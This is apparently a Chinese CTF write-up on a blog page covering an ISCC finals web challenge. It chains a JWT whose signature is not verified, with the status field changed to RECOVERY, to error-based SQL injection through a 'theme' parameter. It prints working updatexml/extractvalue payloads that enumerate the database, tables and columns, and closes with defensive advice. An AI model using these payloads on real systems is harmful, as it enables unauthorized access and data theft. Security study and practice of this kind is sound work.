@@ -1,0 +1,516 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="rowen">
+
+
+
+
+
+<title>ISCC 决赛账号恢复大冒险：JWT 验签缺陷与 SQL 注入 | Hexo</title>
+
+
+
+    <link rel="icon" href="/drink.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <!-- 引入jQuery -->
+<script type="text/javascript" src="//libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
+<!-- 雪花特效2 -->
+ <script type="text/javascript" src="/js/snow2.js"></script>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+<script>
+!
+function() {
+function n(n, e, t) {
+return n.getAttribute(e) || t
+}
+function e(n) {
+return document.getElementsByTagName(n)
+}
+function t() {
+var t = e("script"),
+o = t.length,
+i = t[o - 1];
+return {
+l: o,
+z: n(i, "zIndex", -1), //置于主页面背后
+o: n(i, "opacity", .5), //线条透明度
+c: n(i, "color", "0,0,0"), //线条颜色
+n: n(i, "count", 100) //线条数量
+}
+}
+function o() {
+a = m.width = window.innerWidth ||
+document.documentElement.clientWidth || document.body.clientWidth,
+c = m.height = window.innerHeight ||
+document.documentElement.clientHeight || document.body.clientHeight
+}
+function i() {
+r.clearRect(0, 0, a, c);
+var n, e, t, o, m, l;
+s.forEach(function(i, x) {
+for (i.x += i.xa, i.y += i.ya, i.xa *= i.x > a || i.x < 0 ? -1 :
+1, i.ya *= i.y > c || i.y < 0 ? -1 : 1, r.fillRect(i.x - .5, i.y - .5, 1,
+1), e = x + 1; e < u.length; e++) n = u[e],
+null !== n.x && null !== n.y && (o = i.x - n.x, m = i.y - n.y, l
+= o * o + m * m, l < n.max && (n === y && l >= n.max / 2 && (i.x -= .03 * o,
+i.y -= .03 * m), t = (n.max - l) / n.max, r.beginPath(), r.lineWidth = t /
+2, r.strokeStyle = "rgba(" + d.c + "," + (t + .2) + ")", r.moveTo(i.x, i.y),
+r.lineTo(n.x, n.y), r.stroke()))
+}),
+x(i)
+}
+var a, c, u, m = document.createElement("canvas"),
+d = t(),
+l = "c_n" + d.l,
+r = m.getContext("2d"),
+x = window.requestAnimationFrame || window.webkitRequestAnimationFrame
+|| window.mozRequestAnimationFrame || window.oRequestAnimationFrame ||
+window.msRequestAnimationFrame ||
+function(n) {
+window.setTimeout(n, 1e3 / 45)
+},
+w = Math.random,
+y = {
+x: null,
+y: null,
+max: 2e4
+};
+m.id = l,
+m.style.cssText = "position:fixed;top:0;left:0;z-index:" + d.z +
+";opacity:" + d.o,
+e("body")[0].appendChild(m),
+o(),
+window.onresize = o,
+window.onmousemove = function(n) {
+n = n || window.event,
+y.x = n.clientX,
+y.y = n.clientY
+},
+window.onmouseout = function() {
+y.x = null,
+y.y = null
+};
+for (var s = [], f = 0; d.n > f; f++) {
+var h = w() * a,
+g = w() * c,
+v = 2 * w() - 1,
+p = 2 * w() - 1;
+s.push({
+x: h,
+y: g,
+xa: v,
+ya: p,
+max: 6e3
+})
+}
+u = s.concat([y]),
+setTimeout(function() {
+i()
+},
+100)
+} ();
+</script>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">bobo&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">📖博文</a>
+                
+                    <a class="menu-item" href="/category">📚类别</a>
+                
+                    <a class="menu-item" href="/tag">🏷️标签</a>
+                
+                    <a class="menu-item" href="/about">💡关于</a>
+                
+                    <a class="menu-item" href="/links">🔗友链</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">bobo&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">📖博文</a>
+                
+                    <a class="menu-item" href="/category">📚类别</a>
+                
+                    <a class="menu-item" href="/tag">🏷️标签</a>
+                
+                    <a class="menu-item" href="/about">💡关于</a>
+                
+                    <a class="menu-item" href="/links">🔗友链</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">ISCC 决赛账号恢复大冒险：JWT 验签缺陷与 SQL 注入</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">rowen</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">May 20, 2026&nbsp;&nbsp;23:45:00</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/">比赛复现</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="ISCC-决赛账号恢复大冒险：JWT-验签缺陷与-SQL-注入"><a href="#ISCC-决赛账号恢复大冒险：JWT-验签缺陷与-SQL-注入" class="headerlink" title="ISCC 决赛账号恢复大冒险：JWT 验签缺陷与 SQL 注入"></a>ISCC 决赛账号恢复大冒险：JWT 验签缺陷与 SQL 注入</h1><h2 id="一、题目背景"><a href="#一、题目背景" class="headerlink" title="一、题目背景"></a>一、题目背景</h2><p>题目描述围绕“账号恢复”流程展开。整体思路不是爆破账号密码，而是从登录状态、恢复态身份和恢复接口中寻找逻辑缺陷。</p>
+<p>最终利用链：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注册普通账号 -&gt; 获取 JWT -&gt; 篡改 status 为 RECOVERY -&gt; 进入恢复态接口 -&gt; SQL 报错注入 -&gt; 读取 flags 表</span><br></pre></td></tr></table></figure>
+
+<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><p>访问站点后可以看到普通登录和注册功能：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/login</span><br><span class="line">/register</span><br></pre></td></tr></table></figure>
+
+<p>注册并登录普通用户后，服务端下发名为 <code>token</code> 的 JWT Cookie。解码后可以看到类似字段：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;uid&quot;</span><span class="punctuation">:</span> <span class="number">47710</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;test&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="string">&quot;NORMAL&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;exp&quot;</span><span class="punctuation">:</span> <span class="number">1779015980</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>其中 <code>status</code> 字段非常关键。题目主题是账号恢复，因此优先猜测恢复流程可能依赖该字段判断当前用户状态。</p>
+<h2 id="三、JWT-验签缺陷"><a href="#三、JWT-验签缺陷" class="headerlink" title="三、JWT 验签缺陷"></a>三、JWT 验签缺陷</h2><p>将 JWT payload 中：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="string">&quot;NORMAL&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>修改为：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RECOVERY&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>并且不重新签名，只保留原来的签名部分，服务端仍然接受该 token。</p>
+<p>这说明后端存在 JWT 使用问题：</p>
+<ul>
+<li>只解码 JWT 内容。</li>
+<li>没有正确校验签名。</li>
+<li>客户端可以篡改身份状态。</li>
+</ul>
+<p>当 <code>status=RECOVERY</code> 后，可以访问恢复流程相关页面和接口。</p>
+<h2 id="四、恢复接口分析"><a href="#四、恢复接口分析" class="headerlink" title="四、恢复接口分析"></a>四、恢复接口分析</h2><p>恢复页中存在偏好同步接口：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /api/v1/user/sync</span><br></pre></td></tr></table></figure>
+
+<p>请求体类似：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;theme&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dark&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;language&quot;</span><span class="punctuation">:</span> <span class="string">&quot;zh&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>页面提示需要尝试不同主题值验证身份，因此怀疑 <code>theme</code> 参数参与后端 SQL 查询。</p>
+<h2 id="五、SQL-注入确认"><a href="#五、SQL-注入确认" class="headerlink" title="五、SQL 注入确认"></a>五、SQL 注入确认</h2><p>向 <code>theme</code> 传入单引号：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>接口返回 SQL 报错，说明输入破坏了原 SQL 结构。</p>
+<p>继续测试字段数量：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x<span class="string">&#x27; ORDER BY 1-- </span></span><br><span class="line"><span class="string">x&#x27;</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">2</span><span class="comment">-- </span></span><br></pre></td></tr></table></figure>
+
+<p><code>ORDER BY 2</code> 返回未知列错误，说明原始查询结构较简单。</p>
+<p>使用 MariaDB&#x2F;MySQL 报错函数测试：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x<span class="string">&#x27; AND updatexml(1,concat(0x7e,database(),0x7e),1)-- </span></span><br></pre></td></tr></table></figure>
+
+<p>回显得到数据库名：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jwt_downgrade</span><br></pre></td></tr></table></figure>
+
+<p>继续测试当前数据库用户：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x<span class="string">&#x27; AND extractvalue(1,concat(0x7e,user(),0x7e))-- </span></span><br></pre></td></tr></table></figure>
+
+<p>回显：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app_user@localhost</span><br></pre></td></tr></table></figure>
+
+<p>说明该接口存在 error-based SQL injection。</p>
+<h2 id="六、利用细节"><a href="#六、利用细节" class="headerlink" title="六、利用细节"></a>六、利用细节</h2><p>这里有一个容易踩的点：不要先访问 <code>/recovery</code> 页面再打注入。</p>
+<p>如果先访问恢复页面，服务端可能生成临时数据库访问凭证，并让接口优先返回另一类错误，导致 <code>updatexml</code> 的报错内容被覆盖。</p>
+<p>稳定流程：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">登录拿普通 JWT</span><br><span class="line">-&gt; 修改 status=RECOVERY</span><br><span class="line">-&gt; 不访问 /recovery</span><br><span class="line">-&gt; 直接请求 /api/v1/user/sync</span><br><span class="line">-&gt; 通过报错注入读取数据</span><br></pre></td></tr></table></figure>
+
+<h2 id="七、枚举数据库"><a href="#七、枚举数据库" class="headerlink" title="七、枚举数据库"></a>七、枚举数据库</h2><p>枚举当前库表名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x<span class="string">&#x27; AND updatexml(1,concat(0x7e,</span></span><br><span class="line"><span class="string">(SELECT group_concat(table_name)</span></span><br><span class="line"><span class="string"> FROM information_schema.tables</span></span><br><span class="line"><span class="string"> WHERE table_schema=database()),</span></span><br><span class="line"><span class="string">0x7e),1)-- </span></span><br></pre></td></tr></table></figure>
+
+<p>回显表：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">temp_credentials,users,flags</span><br></pre></td></tr></table></figure>
+
+<p>读取 <code>flags</code> 表字段：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x<span class="string">&#x27; AND updatexml(1,concat(0x7e,</span></span><br><span class="line"><span class="string">(SELECT group_concat(column_name)</span></span><br><span class="line"><span class="string"> FROM information_schema.columns</span></span><br><span class="line"><span class="string"> WHERE table_name=&#x27;</span>flags<span class="string">&#x27;),</span></span><br><span class="line"><span class="string">0x7e),1)-- </span></span><br></pre></td></tr></table></figure>
+
+<p>最后读取 flag 字段即可。</p>
+<h2 id="八、漏洞总结"><a href="#八、漏洞总结" class="headerlink" title="八、漏洞总结"></a>八、漏洞总结</h2><p>这道题的核心不是单独的 SQL 注入，而是两个漏洞串联：</p>
+<table>
+<thead>
+<tr>
+<th>环节</th>
+<th>漏洞</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>身份状态</td>
+<td>JWT 未正确验签</td>
+</tr>
+<tr>
+<td>恢复接口</td>
+<td><code>theme</code> 参数存在 SQL 注入</td>
+</tr>
+<tr>
+<td>结果获取</td>
+<td>报错注入回显数据库内容</td>
+</tr>
+</tbody></table>
+<p>如果只看普通用户接口，可能找不到注入点；只有先通过 JWT 进入恢复态，才能访问关键接口。</p>
+<h2 id="九、防护建议"><a href="#九、防护建议" class="headerlink" title="九、防护建议"></a>九、防护建议</h2><ul>
+<li>JWT 必须使用服务端密钥严格验签。</li>
+<li>不信任客户端传来的身份状态字段。</li>
+<li>恢复流程应在服务端维护状态，不应完全依赖 token payload。</li>
+<li>SQL 查询使用预编译语句。</li>
+<li>关闭生产环境数据库详细报错。</li>
+<li>对敏感接口增加权限校验和操作审计。</li>
+</ul>
+<h2 id="十、复盘"><a href="#十、复盘" class="headerlink" title="十、复盘"></a>十、复盘</h2><p>这题很适合练习“逻辑漏洞 + 注入”的组合分析。做题时不能只盯输入框，还要关注登录态、Cookie、JWT、用户状态和隐藏业务流程。</p>
+<p>完整攻击链说明：一个看似普通的 token 字段篡改，可能成为进入高危接口的入口；而高危接口中的 SQL 注入，最终完成敏感数据读取。</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>rowen</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://forkmmat.github.io/2026/05/20/ISCC%E5%86%B3%E8%B5%9B-%E8%B4%A6%E5%8F%B7%E6%81%A2%E5%A4%8D%E5%A4%A7%E5%86%92%E9%99%A9-JWT%E9%AA%8C%E7%AD%BE%E7%BC%BA%E9%99%B7%E4%B8%8ESQL%E6%B3%A8%E5%85%A5/">https://forkmmat.github.io/2026/05/20/ISCC%E5%86%B3%E8%B5%9B-%E8%B4%A6%E5%8F%B7%E6%81%A2%E5%A4%8D%E5%A4%A7%E5%86%92%E9%99%A9-JWT%E9%AA%8C%E7%AD%BE%E7%BC%BA%E9%99%B7%E4%B8%8ESQL%E6%B3%A8%E5%85%A5/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/ISCC/"># ISCC</a>
+                    
+                        <a href="/tags/Web%E5%AE%89%E5%85%A8/"># Web安全</a>
+                    
+                        <a href="/tags/JWT/"># JWT</a>
+                    
+                        <a href="/tags/SQL%E6%B3%A8%E5%85%A5/"># SQL注入</a>
+                    
+                        <a href="/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"># 逻辑漏洞</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2026/05/21/ISCC%E5%86%B3%E8%B5%9B-%E7%BC%96%E7%A0%81%E8%BF%B7%E5%AE%AB-SpEL%E5%8F%8D%E5%B0%84%E9%93%BE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/">ISCC 决赛编码迷宫：SpEL 反射链读取文件</a>
+            
+            
+            <a class="next" rel="next" href="/2026/05/20/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP%E9%93%BE%E5%AD%A6%E4%B9%A0-%E4%BB%8Ewakeup%E7%BB%95%E8%BF%87%E5%88%B0%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E6%96%87%E4%BB%B6/">PHP 反序列化 POP 链学习：从 wakeup 绕过到伪协议读文件</a>
+            
+        </section>
+<script src="https://giscus.app/client.js"
+        data-repo="forkmmat/forkmmat.github.io"
+        data-repo-id="R_kgDOO0OA0g"
+        data-category="General"
+        data-category-id="DIC_kwDOO0OA0s4CtD6Y"
+        data-mapping="title"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="top"
+        data-theme="preferred_color_scheme"
+        data-lang="zh-CN"
+        data-loading="lazy"
+        crossorigin="anonymous"
+        async>
+</script>
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© rowen | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
